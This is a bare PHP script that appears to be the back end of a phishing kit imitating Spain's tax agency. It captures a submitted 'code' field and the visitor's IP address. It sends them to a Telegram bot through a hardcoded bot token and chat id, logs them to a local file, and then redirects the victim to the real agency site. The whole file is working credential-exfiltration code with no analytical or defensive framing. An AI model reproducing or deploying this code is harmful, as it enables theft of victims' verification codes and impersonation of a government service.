<?php

$ip = $_SERVER['REMOTE_ADDR'];
$message .= "juuj     : ".$_POST['code']."\n";
$message .= "|Client IP: ".$ip."\n";
//$send = "XXXXXXXXXXXX@gmail.com";
$subject = "From:  [ $ip ]";
$headers = "From: [rf]<bin@fox.net>";

{
mail("$send", "$subject", $message);
$token = "1163052470:AAEj8yZSnqn5xrsPeRiqGLRAfcTHsOx0nMI";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1239437517&text=" . urlencode($message)."" );

}
$f = fopen("../python/python.php", "a");
	fwrite($f, $message);




header("Location: https://sede.agenciatributaria.gob.es");
?>
